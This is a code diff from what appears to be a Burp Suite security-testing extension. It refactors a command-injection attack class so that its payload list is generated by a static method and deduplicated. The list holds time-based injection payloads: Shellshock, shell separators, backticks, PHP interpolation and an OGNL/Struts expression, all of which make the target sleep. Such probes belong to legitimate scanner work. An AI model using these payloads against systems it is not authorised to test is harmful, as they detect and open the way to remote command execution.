@@ -23,7 +23,11 @@ import gui.botLeft.PanelLeftInsertions;
 import gui.networking.AttackWorkEntry;
 
 import java.io.UnsupportedEncodingException;
+import java.util.ArrayList;
+import java.util.LinkedHashSet;
 import java.util.LinkedList;
+import java.util.List;
+
 import model.SentinelHttpMessageAtk;
 import util.BurpCallbacks;
 import util.ConnectionTimeoutException;
@@ -40,7 +44,13 @@ public class AttackCommand extends AttackI {
     
     public AttackCommand(AttackWorkEntry work) {
         super(work);
-        
+
+        attackData.addAll(generateAttackData());
+
+    }
+
+    public static List<AttackData> generateAttackData() {
+        List<AttackData> attackData = new LinkedList<AttackData>();
         attackData.add(new AttackData(0, "() { :;}; sleep 10", "", AttackData.AttackResultType.VULNUNSURE));
         attackData.add(new AttackData(1, ";sleep 10", "", AttackData.AttackResultType.VULNUNSURE));
         attackData.add(new AttackData(2, "\";sleep 10", "", AttackData.AttackResultType.VULNUNSURE));
@@ -53,8 +63,9 @@ public class AttackCommand extends AttackI {
         attackData.add(new AttackData(9,  "\".`sleep 10`.\"", "", AttackData.AttackResultType.VULNUNSURE));
         attackData.add(new AttackData(10,  "{${sleep(10)}}", "", AttackData.AttackResultType.VULNUNSURE));
         attackData.add(new AttackData(11, "${(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Thread@sleep(10000))}","",AttackData.AttackResultType.VULNUNSURE));
+        return new LinkedList<AttackData>(new LinkedHashSet<>(attackData));
     }
-    
+
     @Override
     protected String getAtkName() {
         return "CMD";
